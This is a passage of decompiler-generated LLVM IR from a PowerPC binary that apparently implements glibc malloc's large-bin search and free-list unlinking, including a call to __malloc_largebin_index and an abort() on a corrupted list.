  %v0_1000b154 = load i32, i32* @r8, align 4
  store i32 %v0_1000b154, i32* @global_var_10023a6c.485, align 4
  br i1 %v4_1000b14c, label %dec_label_pc_1000b15c, label %dec_label_pc_1000b16c

dec_label_pc_1000b15c:                            ; preds = %dec_label_pc_1000b14c
  %v0_1000b15c = load i32, i32* @r31, align 4
  %v1_1000b15c = load i32, i32* @r26, align 4
  %v2_1000b15c = add i32 %v1_1000b15c, %v0_1000b15c
  store i32 %v2_1000b15c, i32* %r9.global-to-local, align 4
  %v1_1000b160 = add i32 %v0_1000b15c, 8
  store i32 %v1_1000b160, i32* @r30, align 4
  %v1_1000b164 = add i32 %v2_1000b15c, 4
  %v2_1000b164 = inttoptr i32 %v1_1000b164 to i32*
  %v3_1000b164 = load i32, i32* %v2_1000b164, align 4
  store i32 %v3_1000b164, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b2ac

dec_label_pc_1000b16c:                            ; preds = %dec_label_pc_1000b14c
  %v2_1000b16c = icmp ugt i32 %v1_1000b0f0, 255
  store i1 %v2_1000b16c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b16c, label %dec_label_pc_1000b18c, label %dec_label_pc_1000b174

dec_label_pc_1000b174:                            ; preds = %dec_label_pc_1000b16c
  %v1_1000b174 = udiv i32 %v1_1000b0f0, 8
  store i32 %v1_1000b174, i32* %r3.global-to-local, align 4
  %v1_1000b178 = mul nuw i32 %v1_1000b174, 8
  %v1_1000b17c = load i32, i32* @r27, align 4
  %v2_1000b17c = add i32 %v1_1000b17c, %v1_1000b178
  store i32 %v2_1000b17c, i32* %r9.global-to-local, align 4
  %v1_1000b180 = add i32 %v2_1000b17c, 44
  store i32 %v1_1000b180, i32* %r8.global-to-local, align 4
  %v1_1000b184 = add i32 %v2_1000b17c, 52
  %v2_1000b184 = inttoptr i32 %v1_1000b184 to i32*
  %v3_1000b184 = load i32, i32* %v2_1000b184, align 4
  store i32 %v3_1000b184, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000b1e0

dec_label_pc_1000b18c:                            ; preds = %dec_label_pc_1000b16c
  store i32 %v1_1000b0f0, i32* %r3.global-to-local, align 4
  store i32 268480916, i32* @lr, align 4
  %v1_1000b190 = call i32 @__malloc_largebin_index(i32 %v1_1000b0f0)
  store i32 %v1_1000b190, i32* %r3.global-to-local, align 4
  %v1_1000b194 = mul i32 %v1_1000b190, 8
  %v1_1000b198 = load i32, i32* @r27, align 4
  %v2_1000b198 = add i32 %v1_1000b198, %v1_1000b194
  store i32 %v2_1000b198, i32* %r9.global-to-local, align 4
  %v1_1000b19c = add i32 %v2_1000b198, 44
  store i32 %v1_1000b19c, i32* %r8.global-to-local, align 4
  %v1_1000b1a0 = add i32 %v2_1000b198, 52
  %v2_1000b1a0 = inttoptr i32 %v1_1000b1a0 to i32*
  %v3_1000b1a0 = load i32, i32* %v2_1000b1a0, align 4
  store i32 %v3_1000b1a0, i32* %r7.global-to-local, align 4
  %v3_1000b1a4 = icmp sgt i32 %v3_1000b1a0, %v1_1000b19c
  %v4_1000b1a4 = icmp eq i32 %v3_1000b1a0, %v1_1000b19c
  store i1 %v3_1000b1a4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b1a4, label %dec_label_pc_1000b1e0, label %dec_label_pc_1000b1ac

dec_label_pc_1000b1ac:                            ; preds = %dec_label_pc_1000b18c
  %v1_1000b1ac = add i32 %v2_1000b198, 56
  %v2_1000b1ac = inttoptr i32 %v1_1000b1ac to i32*
  %v3_1000b1ac = load i32, i32* %v2_1000b1ac, align 4
  store i32 %v3_1000b1ac, i32* %r9.global-to-local, align 4
  %v1_1000b1b0 = or i32 %v1_1000b0f0, 1
  store i32 %v1_1000b1b0, i32* %r11.global-to-local, align 4
  %v1_1000b1b4 = add i32 %v3_1000b1ac, 4
  %v2_1000b1b4 = inttoptr i32 %v1_1000b1b4 to i32*
  %v3_1000b1b4 = load i32, i32* %v2_1000b1b4, align 4
  store i32 %v3_1000b1b4, i32* %r0.global-to-local, align 4
  %v2_1000b1b8 = icmp ult i32 %v1_1000b0f0, %v3_1000b1b4
  %v3_1000b1b8 = icmp ugt i32 %v1_1000b0f0, %v3_1000b1b4
  store i1 %v3_1000b1b8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b1b8, label %dec_label_pc_1000b1c0, label %dec_label_pc_1000b1d0.preheader

dec_label_pc_1000b1d0.preheader:                  ; preds = %dec_label_pc_1000b1ac
  %v1_1000b1d013 = add i32 %v3_1000b1a0, 4
  %v2_1000b1d014 = inttoptr i32 %v1_1000b1d013 to i32*
  %v3_1000b1d015 = load i32, i32* %v2_1000b1d014, align 4
  store i32 %v3_1000b1d015, i32* %r0.global-to-local, align 4
  %v2_1000b1d417 = icmp ult i32 %v1_1000b1b0, %v3_1000b1d015
  %v3_1000b1d418 = icmp ugt i32 %v1_1000b1b0, %v3_1000b1d015
  store i1 %v3_1000b1d418, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b1d417, label %dec_label_pc_1000b1cc, label %dec_label_pc_1000b1dc

dec_label_pc_1000b1c0:                            ; preds = %dec_label_pc_1000b1ac
  store i32 %v1_1000b19c, i32* %r7.global-to-local, align 4
  store i32 %v3_1000b1ac, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000b1e0

dec_label_pc_1000b1cc:                            ; preds = %dec_label_pc_1000b1d0.preheader, %dec_label_pc_1000b1cc
  %v0_1000b1cc21 = phi i32 [ %v3_1000b1cc, %dec_label_pc_1000b1cc ], [ %v3_1000b1a0, %dec_label_pc_1000b1d0.preheader ]
  %v1_1000b1cc = add i32 %v0_1000b1cc21, 8
  %v2_1000b1cc = inttoptr i32 %v1_1000b1cc to i32*
  %v3_1000b1cc = load i32, i32* %v2_1000b1cc, align 4
  store i32 %v3_1000b1cc, i32* %r7.global-to-local, align 4
  %v1_1000b1d0 = add i32 %v3_1000b1cc, 4
  %v2_1000b1d0 = inttoptr i32 %v1_1000b1d0 to i32*
  %v3_1000b1d0 = load i32, i32* %v2_1000b1d0, align 4
  store i32 %v3_1000b1d0, i32* %r0.global-to-local, align 4
  %v2_1000b1d4 = icmp ult i32 %v1_1000b1b0, %v3_1000b1d0
  br i1 %v2_1000b1d4, label %dec_label_pc_1000b1cc, label %dec_label_pc_1000b1d0.dec_label_pc_1000b1dc_crit_edge

dec_label_pc_1000b1d0.dec_label_pc_1000b1dc_crit_edge: ; preds = %dec_label_pc_1000b1cc
  %v3_1000b1d4 = icmp ugt i32 %v1_1000b1b0, %v3_1000b1d0
  store i1 %v3_1000b1d4, i1* %cr7_gt.global-to-local, align 1
  br label %dec_label_pc_1000b1dc

dec_label_pc_1000b1dc:                            ; preds = %dec_label_pc_1000b1d0.dec_label_pc_1000b1dc_crit_edge, %dec_label_pc_1000b1d0.preheader
  %v0_1000b1cc.lcssa = phi i32 [ %v3_1000b1cc, %dec_label_pc_1000b1d0.dec_label_pc_1000b1dc_crit_edge ], [ %v3_1000b1a0, %dec_label_pc_1000b1d0.preheader ]
  %v1_1000b1dc = add i32 %v0_1000b1cc.lcssa, 12
  %v2_1000b1dc = inttoptr i32 %v1_1000b1dc to i32*
  %v3_1000b1dc = load i32, i32* %v2_1000b1dc, align 4
  store i32 %v3_1000b1dc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000b1e0

dec_label_pc_1000b1e0:                            ; preds = %dec_label_pc_1000b18c, %dec_label_pc_1000b1c0, %dec_label_pc_1000b174, %dec_label_pc_1000b1dc
  %v0_1000b1fc = phi i32 [ %v1_1000b19c, %dec_label_pc_1000b18c ], [ %v3_1000b1ac, %dec_label_pc_1000b1c0 ], [ %v1_1000b180, %dec_label_pc_1000b174 ], [ %v3_1000b1dc, %dec_label_pc_1000b1dc ]
  %v1_1000b1f0 = phi i32 [ %v1_1000b198, %dec_label_pc_1000b18c ], [ %v1_1000b198, %dec_label_pc_1000b1c0 ], [ %v1_1000b17c, %dec_label_pc_1000b174 ], [ %v1_1000b198, %dec_label_pc_1000b1dc ]
  %v0_1000b1e0 = phi i32 [ %v1_1000b190, %dec_label_pc_1000b18c ], [ %v1_1000b190, %dec_label_pc_1000b1c0 ], [ %v1_1000b174, %dec_label_pc_1000b174 ], [ %v1_1000b190, %dec_label_pc_1000b1dc ]
  %v4_1000b1e0 = sdiv i32 %v0_1000b1e0, 32
  %v1_1000b1e4 = urem i32 %v0_1000b1e0, 32
  store i32 %v1_1000b1e4, i32* @r11, align 4
  %v1_1000b1e8 = mul nsw i32 %v4_1000b1e0, 4
  %v2_1000b1f0 = add i32 %v1_1000b1e8, %v1_1000b1f0
  store i32 %v2_1000b1f0, i32* %r9.global-to-local, align 4
  %v3_1000b1f4 = shl i32 1, %v1_1000b1e4
  store i32 %v3_1000b1f4, i32* %r0.global-to-local, align 4
  %v1_1000b1f8 = add i32 %v2_1000b1f0, 820
  %v2_1000b1f8 = inttoptr i32 %v1_1000b1f8 to i32*
  %v3_1000b1f8 = load i32, i32* %v2_1000b1f8, align 4
  store i32 %v3_1000b1f8, i32* %r10.global-to-local, align 4
  %v1_1000b1fc = load i32, i32* @r31, align 4
  %v2_1000b1fc = add i32 %v1_1000b1fc, 12
  %v3_1000b1fc = inttoptr i32 %v2_1000b1fc to i32*
  store i32 %v0_1000b1fc, i32* %v3_1000b1fc, align 4
  %v0_1000b200 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b200 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b200 = or i32 %v1_1000b200, %v0_1000b200
  store i32 %v2_1000b200, i32* %r0.global-to-local, align 4
  %v0_1000b204 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000b204 = load i32, i32* @r31, align 4
  %v2_1000b204 = add i32 %v1_1000b204, 8
  %v3_1000b204 = inttoptr i32 %v2_1000b204 to i32*
  store i32 %v0_1000b204, i32* %v3_1000b204, align 4
  %v0_1000b208 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b208 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b208 = add i32 %v1_1000b208, 820
  %v3_1000b208 = inttoptr i32 %v2_1000b208 to i32*
  store i32 %v0_1000b208, i32* %v3_1000b208, align 4
  %v0_1000b20c = load i32, i32* @r31, align 4
  %v1_1000b20c = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b20c = add i32 %v1_1000b20c, 12
  %v3_1000b20c = inttoptr i32 %v2_1000b20c to i32*
  store i32 %v0_1000b20c, i32* %v3_1000b20c, align 4
  %v0_1000b210 = load i32, i32* @r31, align 4
  %v1_1000b210 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b210 = add i32 %v1_1000b210, 8
  %v3_1000b210 = inttoptr i32 %v2_1000b210 to i32*
  store i32 %v0_1000b210, i32* %v3_1000b210, align 4
  %v1_1000b230.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000b238.pre = load i32, i32* @r26, align 4
  %v3_1000b22c = load i32, i32* @global_var_10023a6c.485, align 4
  store i32 %v3_1000b22c, i32* @r31, align 4
  %v4_1000b230 = icmp eq i32 %v3_1000b22c, %v1_1000b230.pre
  %v2_1000b238 = icmp ugt i32 %v0_1000b238.pre, 255
  store i1 %v2_1000b238, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b230, label %dec_label_pc_1000b238, label %dec_label_pc_1000b0e4

dec_label_pc_1000b218:                            ; preds = %dec_label_pc_1000b0c0, %dec_label_pc_1000b07c, %dec_label_pc_1000b0d4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000b21c = load i32, i32* @r26, align 4
  %v1_1000b21c = add i32 %v0_1000b21c, 16
  store i32 %v1_1000b21c, i32* @r24, align 4
  store i32 ptrtoint (i32* @global_var_10023a60.483 to i32), i32* %r30.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r25, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r27, align 4
  %v3_1000b22c98 = load i32, i32* @global_var_10023a6c.485, align 4
  store i32 %v3_1000b22c98, i32* @r31, align 4
  %v4_1000b23099 = icmp eq i32 %v3_1000b22c98, ptrtoint (i32* @global_var_10023a60.483 to i32)
  %v2_1000b238101 = icmp ugt i32 %v0_1000b21c, 255
  store i1 %v2_1000b238101, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b23099, label %dec_label_pc_1000b238, label %dec_label_pc_1000b0e4

dec_label_pc_1000b238:                            ; preds = %dec_label_pc_1000b1e0, %dec_label_pc_1000b218
  %v0_1000b238.lcssa = phi i32 [ %v0_1000b21c, %dec_label_pc_1000b218 ], [ %v0_1000b238.pre, %dec_label_pc_1000b1e0 ]
  %v1_1000b230.lcssa = phi i32 [ ptrtoint (i32* @global_var_10023a60.483 to i32), %dec_label_pc_1000b218 ], [ %v1_1000b230.pre, %dec_label_pc_1000b1e0 ]
  %tmp77 = icmp ult i32 %v0_1000b238.lcssa, 256
  br i1 %tmp77, label %dec_label_pc_1000b2f4, label %dec_label_pc_1000b240

dec_label_pc_1000b240:                            ; preds = %dec_label_pc_1000b238
  %v0_1000b240 = load i32, i32* @r28, align 4
  %v1_1000b240 = mul i32 %v0_1000b240, 8
  %v2_1000b244 = add i32 %v1_1000b240, %v1_1000b230.lcssa
  store i32 %v2_1000b244, i32* %r9.global-to-local, align 4
  %v1_1000b248 = add i32 %v2_1000b244, -8
  store i32 %v1_1000b248, i32* %r11.global-to-local, align 4
  %v1_1000b24c = add i32 %v2_1000b244, 4
  %v2_1000b24c = inttoptr i32 %v1_1000b24c to i32*
  %storemerge93 = load i32, i32* %v2_1000b24c, align 4
  store i32 %storemerge93, i32* %r10.global-to-local, align 4
  %v3_1000b2ec95 = icmp sgt i32 %storemerge93, %v1_1000b248
  %v4_1000b2ec96 = icmp eq i32 %storemerge93, %v1_1000b248
  store i1 %v3_1000b2ec95, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b2ec96, label %dec_label_pc_1000b2f4, label %dec_label_pc_1000b254

dec_label_pc_1000b254:                            ; preds = %dec_label_pc_1000b240, %dec_label_pc_1000b254.dec_label_pc_1000b2ec_crit_edge
  %storemerge97 = phi i32 [ %storemerge, %dec_label_pc_1000b254.dec_label_pc_1000b2ec_crit_edge ], [ %storemerge93, %dec_label_pc_1000b240 ]
  %v1_1000b254 = add i32 %storemerge97, 4
  %v2_1000b254 = inttoptr i32 %v1_1000b254 to i32*
  %v3_1000b254 = load i32, i32* %v2_1000b254, align 4
  store i32 %v3_1000b254, i32* %r0.global-to-local, align 4
  %v1_1000b258 = add i32 %storemerge97, 12
  %v2_1000b258 = inttoptr i32 %v1_1000b258 to i32*
  %v3_1000b258 = load i32, i32* %v2_1000b258, align 4
  store i32 %v3_1000b258, i32* %r7.global-to-local, align 4
  %v1_1000b25c = call i32 @__asm_rlwinm(i32 %v3_1000b254, i32 0, i32 0, i32 29)
  store i32 %v1_1000b25c, i32* %r9.global-to-local, align 4
  %v1_1000b260 = load i32, i32* @r26, align 4
  %v2_1000b260 = icmp ult i32 %v1_1000b25c, %v1_1000b260
  %v3_1000b260 = icmp ugt i32 %v1_1000b25c, %v1_1000b260
  store i1 %v3_1000b260, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b260, label %dec_label_pc_1000b254.dec_label_pc_1000b2ec_crit_edge, label %dec_label_pc_1000b268

dec_label_pc_1000b254.dec_label_pc_1000b2ec_crit_edge: ; preds = %dec_label_pc_1000b254
  %v1_1000b2ec.pre = load i32, i32* %r11.global-to-local, align 4
  %storemerge = load i32, i32* %r7.global-to-local, align 4
  store i32 %storemerge, i32* %r10.global-to-local, align 4
  %v3_1000b2ec = icmp sgt i32 %storemerge, %v1_1000b2ec.pre
  %v4_1000b2ec = icmp eq i32 %storemerge, %v1_1000b2ec.pre
  store i1 %v3_1000b2ec, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b2ec, label %dec_label_pc_1000b2f4, label %dec_label_pc_1000b254

dec_label_pc_1000b268:                            ; preds = %dec_label_pc_1000b254
  %v0_1000b268 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b268 = add i32 %v0_1000b268, 8
  %v2_1000b268 = inttoptr i32 %v1_1000b268 to i32*
  %v3_1000b268 = load i32, i32* %v2_1000b268, align 4
  store i32 %v3_1000b268, i32* @r11, align 4
  %v1_1000b26c = add i32 %v3_1000b268, 12
  %v2_1000b26c = inttoptr i32 %v1_1000b26c to i32*
  %v3_1000b26c = load i32, i32* %v2_1000b26c, align 4
  store i32 %v3_1000b26c, i32* %r0.global-to-local, align 4
  %v3_1000b270 = icmp sgt i32 %v3_1000b26c, %v0_1000b268
  %v4_1000b270 = icmp eq i32 %v3_1000b26c, %v0_1000b268
  store i1 %v3_1000b270, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b270, label %dec_label_pc_1000b278, label %dec_label_pc_1000b284

dec_label_pc_1000b278:                            ; preds = %dec_label_pc_1000b268
  %v0_1000b278 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000b278 = add i32 %v0_1000b278, 8
  %v2_1000b278 = inttoptr i32 %v1_1000b278 to i32*
  %v3_1000b278 = load i32, i32* %v2_1000b278, align 4
  store i32 %v3_1000b278, i32* %r0.global-to-local, align 4
  %v3_1000b27c = icmp sgt i32 %v3_1000b278, %v0_1000b268
  %v4_1000b27c = icmp eq i32 %v3_1000b278, %v0_1000b268
  store i1 %v3_1000b27c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b27c, label %dec_label_pc_1000b288, label %dec_label_pc_1000b284

dec_label_pc_1000b284:                            ; preds = %dec_label_pc_1000b268, %dec_label_pc_1000b278
  %v0_1000b284 = call i32 @abort()
  store i32 %v0_1000b284, i32* %r3.global-to-local, align 4
  %v0_1000b288.pre = load i32, i32* @r26, align 4
  %v0_1000b28c.pre = load i32, i32* @r11, align 4
  %v1_1000b28c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000b288

dec_label_pc_1000b288:                            ; preds = %dec_label_pc_1000b278, %dec_label_pc_1000b284
  %v1_1000b28c = phi i32 [ %v0_1000b278, %dec_label_pc_1000b278 ], [ %v1_1000b28c.pre, %dec_label_pc_1000b284 ]
  %v0_1000b28c = phi i32 [ %v3_1000b268, %dec_label_pc_1000b278 ], [ %v0_1000b28c.pre, %dec_label_pc_1000b284 ]
  %v0_1000b288 = phi i32 [ %v1_1000b260, %dec_label_pc_1000b278 ], [ %v0_1000b288.pre, %dec_label_pc_1000b284 ]
  %v2_1000b288 = sub i32 %v1_1000b25c, %v0_1000b288
  store i32 %v2_1000b288, i32* @r8, align 4
  %v2_1000b28c = add i32 %v1_1000b28c, 8
  %v3_1000b28c = inttoptr i32 %v2_1000b28c to i32*
  store i32 %v0_1000b28c, i32* %v3_1000b28c, align 4
  %v0_1000b290 = load i32, i32* @r8, align 4
  %v2_1000b290 = icmp ugt i32 %v0_1000b290, 15
  store i1 %v2_1000b290, i1* %cr7_gt.global-to-local, align 1
  %v0_1000b294 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000b294 = load i32, i32* @r11, align 4
  %v2_1000b294 = add i32 %v1_1000b294, 12
  %v3_1000b294 = inttoptr i32 %v2_1000b294 to i32*
  store i32 %v0_1000b294, i32* %v3_1000b294, align 4
  %v0_1000b298 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b298 = add i32 %v0_1000b298, 8
  store i32 %v1_1000b298, i32* %r3.global-to-local, align 4
  br i1 %v2_1000b290, label %dec_label_pc_1000b2b8, label %dec_label_pc_1000b2a0

dec_label_pc_1000b2a0:                            ; preds = %dec_label_pc_1000b288
  %v2_1000b2a0 = add i32 %v0_1000b298, %v1_1000b25c
  store i32 %v2_1000b2a0, i32* %r9.global-to-local, align 4
  store i32 %v1_1000b298, i32* @r30, align 4
  %v1_1000b2a8 = add i32 %v2_1000b2a0, 4
  %v2_1000b2a8 = inttoptr i32 %v1_1000b2a8 to i32*
  %v3_1000b2a8 = load i32, i32* %v2_1000b2a8, align 4
  store i32 %v3_1000b2a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b2ac

dec_label_pc_1000b2ac:                            ; preds = %dec_label_pc_1000b3e0, %dec_label_pc_1000b15c, %dec_label_pc_1000b2a0
  %v1_1000b2b0 = phi i32 [ %v2_1000b3e0, %dec_label_pc_1000b3e0 ], [ %v2_1000b15c, %dec_label_pc_1000b15c ], [ %v2_1000b2a0, %dec_label_pc_1000b2a0 ]
  %v0_1000b2ac = phi i32 [ %v3_1000b3e8, %dec_label_pc_1000b3e0 ], [ %v3_1000b164, %dec_label_pc_1000b15c ], [ %v3_1000b2a8, %dec_label_pc_1000b2a0 ]
  %v1_1000b2ac = or i32 %v0_1000b2ac, 1
  store i32 %v1_1000b2ac, i32* %r0.global-to-local, align 4
  %v2_1000b2b0 = add i32 %v1_1000b2b0, 4
  %v3_1000b2b0 = inttoptr i32 %v2_1000b2b0 to i32*
  store i32 %v1_1000b2ac, i32* %v3_1000b2b0, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b2b8:                            ; preds = %dec_label_pc_1000b288
  %v1_1000b2b8 = load i32, i32* @r26, align 4
  %v2_1000b2b8 = add i32 %v1_1000b2b8, %v0_1000b298
  store i32 %v2_1000b2b8, i32* %r9.global-to-local, align 4
  %v1_1000b2bc = or i32 %v1_1000b2b8, 1
  store i32 %v1_1000b2bc, i32* %r0.global-to-local, align 4
  %v0_1000b2c0 = load i32, i32* @r8, align 4
  %v1_1000b2c0 = or i32 %v0_1000b2c0, 1
  store i32 %v1_1000b2c0, i32* @r11, align 4
  store i32 %v1_1000b298, i32* @r30, align 4
  %v2_1000b2c8 = add i32 %v0_1000b298, 4
  %v3_1000b2c8 = inttoptr i32 %v2_1000b2c8 to i32*
  store i32 %v1_1000b2bc, i32* %v3_1000b2c8, align 4
  %v0_1000b2cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b2cc = load i32, i32* @r31, align 4
  %v2_1000b2cc = add i32 %v1_1000b2cc, 8
  %v3_1000b2cc = inttoptr i32 %v2_1000b2cc to i32*
  store i32 %v0_1000b2cc, i32* %v3_1000b2cc, align 4
  %v0_1000b2d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b2d0 = load i32, i32* @r31, align 4
  %v2_1000b2d0 = add i32 %v1_1000b2d0, 12
  %v3_1000b2d0 = inttoptr i32 %v2_1000b2d0 to i32*
  store i32 %v0_1000b2d0, i32* %v3_1000b2d0, align 4
  %v0_1000b2d4 = load i32, i32* @r8, align 4
  %v1_1000b2d4 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000b2d4 = add i32 %v1_1000b2d4, %v0_1000b2d4
  %v4_1000b2d4 = inttoptr i32 %v3_1000b2d4 to i32*
  store i32 %v0_1000b2d4, i32* %v4_1000b2d4, align 4
  %v0_1000b2d8 = load i32, i32* @r11, align 4
  %v1_1000b2d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b2d8 = add i32 %v1_1000b2d8, 4
  %v3_1000b2d8 = inttoptr i32 %v2_1000b2d8 to i32*
  store i32 %v0_1000b2d8, i32* %v3_1000b2d8, align 4
  %v0_1000b2dc = load i32, i32* @r31, align 4
  %v1_1000b2dc = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b2dc = add i32 %v1_1000b2dc, 12
  %v3_1000b2dc = inttoptr i32 %v2_1000b2dc to i32*
  store i32 %v0_1000b2dc, i32* %v3_1000b2dc, align 4
  %v0_1000b2e0 = load i32, i32* @r31, align 4
  %v1_1000b2e0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b2e0 = add i32 %v1_1000b2e0, 8
  %v3_1000b2e0 = inttoptr i32 %v2_1000b2e0 to i32*
  store i32 %v0_1000b2e0, i32* %v3_1000b2e0, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b2f4:                            ; preds = %dec_label_pc_1000b240, %dec_label_pc_1000b254.dec_label_pc_1000b2ec_crit_edge, %dec_label_pc_1000b238
  %v0_1000b2f4 = load i32, i32* @r28, align 4
  %v1_1000b2f4 = add i32 %v0_1000b2f4, 1
  store i32 ptrtoint (i32* @global_var_10023a60.483 to i32), i32* @r8, align 4
  %v1_1000b300 = udiv i32 %v1_1000b2f4, 32
  store i32 %v1_1000b300, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* %r7.global-to-local, align 4
  %v1_1000b308 = mul nuw nsw i32 %v1_1000b300, 4
  %v1_1000b30c = mul i32 %v1_1000b2f4, 8
  %v2_1000b310 = add i32 %v1_1000b308, ptrtoint (i32* @global_var_10023a2c.481 to i32)
  store i32 %v2_1000b310, i32* %r9.global-to-local, align 4
  %v1_1000b314 = urem i32 %v1_1000b2f4, 32
  store i32 %v1_1000b314, i32* %r10.global-to-local, align 4
  %v2_1000b318 = add i32 %v1_1000b30c, ptrtoint (i32* @global_var_10023a60.483 to i32)
  store i32 %v2_1000b318, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000b320 = add i32 %v1_1000b308, add (i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32 820)
  %v2_1000b320 = inttoptr i32 %v1_1000b320 to i32*
  %v3_1000b320 = load i32, i32* %v2_1000b320, align 4
  store i32 %v3_1000b320, i32* %r5.global-to-local, align 4
  %v3_1000b324 = shl i32 1, %v1_1000b314
  store i32 %v3_1000b324, i32* %r0.global-to-local, align 4
  %v1_1000b328 = add i32 %v1_1000b30c, add (i32 ptrtoint (i32* @global_var_10023a60.483 to i32), i32 -8)
  store i32 %v1_1000b328, i32* @r11, align 4
  br label %dec_label_pc_1000b32c

dec_label_pc_1000b32c:                            ; preds = %dec_label_pc_1000b3a4, %dec_label_pc_1000b2f4
  %v1_1000b32c = phi i32 [ %v1_1000b32c.pre, %dec_label_pc_1000b3a4 ], [ %v3_1000b320, %dec_label_pc_1000b2f4 ]
  %v0_1000b334 = phi i32 [ %v0_1000b32c.pre, %dec_label_pc_1000b3a4 ], [ %v3_1000b324, %dec_label_pc_1000b2f4 ]
  %tmp78 = add i32 %v0_1000b334, -1
  %tmp79 = icmp ult i32 %tmp78, %v1_1000b32c
  br i1 %tmp79, label %dec_label_pc_1000b334.dec_label_pc_1000b390.preheader_crit_edge, label %dec_label_pc_1000b33c

dec_label_pc_1000b334.dec_label_pc_1000b390.preheader_crit_edge: ; preds = %dec_label_pc_1000b32c
  %v0_1000b38810.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000b390.preheader

dec_label_pc_1000b33c:                            ; preds = %dec_label_pc_1000b32c
  %v0_1000b33c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000b33c = add i32 %v0_1000b33c, 1
  %v2_1000b340 = icmp ugt i32 %v1_1000b33c, 3
  %v1_1000b344 = sub i32 3, %v0_1000b33c
  store i32 %v1_1000b344, i32* %r0.global-to-local, align 4
  %tmp80 = icmp ult i32 %v1_1000b33c, 4
  br i1 %tmp80, label %dec_label_pc_1000b358, label %dec_label_pc_1000b350

dec_label_pc_1000b350:                            ; preds = %dec_label_pc_1000b33c
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000b358

dec_label_pc_1000b358:                            ; preds = %dec_label_pc_1000b33c, %dec_label_pc_1000b350, %dec_label_pc_1000b360
  %v0_1000b35c = phi i32 [ %v1_1000b35c, %dec_label_pc_1000b360 ], [ %v1_1000b344, %dec_label_pc_1000b33c ], [ 1, %dec_label_pc_1000b350 ]
  %v0_1000b358 = phi i32 [ %v1_1000b358, %dec_label_pc_1000b360 ], [ %v0_1000b33c, %dec_label_pc_1000b33c ], [ %v0_1000b33c, %dec_label_pc_1000b350 ]
  %v3_1000b39c25 = phi i1 [ %v2_1000b36c, %dec_label_pc_1000b360 ], [ %v2_1000b340, %dec_label_pc_1000b33c ], [ %v2_1000b340, %dec_label_pc_1000b350 ]
  %v1_1000b358 = add i32 %v0_1000b358, 1
  store i32 %v1_1000b358, i32* %r4.global-to-local, align 4
  %v1_1000b35c = add i32 %v0_1000b35c, -1
  %v2_1000b35c = icmp eq i32 %v1_1000b35c, 0
  br i1 %v2_1000b35c, label %dec_label_pc_1000b430.loopexit, label %dec_label_pc_1000b360

dec_label_pc_1000b360:                            ; preds = %dec_label_pc_1000b358
  %v1_1000b360 = mul i32 %v1_1000b358, 4
  %v1_1000b364 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b364 = add i32 %v1_1000b364, %v1_1000b360
  store i32 %v2_1000b364, i32* %r9.global-to-local, align 4
  %v1_1000b368 = add i32 %v2_1000b364, 820
  %v2_1000b368 = inttoptr i32 %v1_1000b368 to i32*
  %v3_1000b368 = load i32, i32* %v2_1000b368, align 4
  store i32 %v3_1000b368, i32* %r5.global-to-local, align 4
  %v2_1000b36c = icmp sgt i32 %v3_1000b368, 0
  %v3_1000b36c = icmp eq i32 %v3_1000b368, 0
  br i1 %v3_1000b36c, label %dec_label_pc_1000b358, label %dec_label_pc_1000b374

dec_label_pc_1000b374:                            ; preds = %dec_label_pc_1000b360
  %v1_1000b374 = mul i32 %v1_1000b358, 256
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000b37c = load i32, i32* @r8, align 4
  %v2_1000b37c = add i32 %v1_1000b37c, %v1_1000b374
  store i32 %v2_1000b37c, i32* %r9.global-to-local, align 4
  %v1_1000b380 = add i32 %v2_1000b37c, -8
  store i32 %v1_1000b380, i32* @r11, align 4
  br label %dec_label_pc_1000b390.preheader

dec_label_pc_1000b390.preheader:                  ; preds = %dec_label_pc_1000b334.dec_label_pc_1000b390.preheader_crit_edge, %dec_label_pc_1000b374
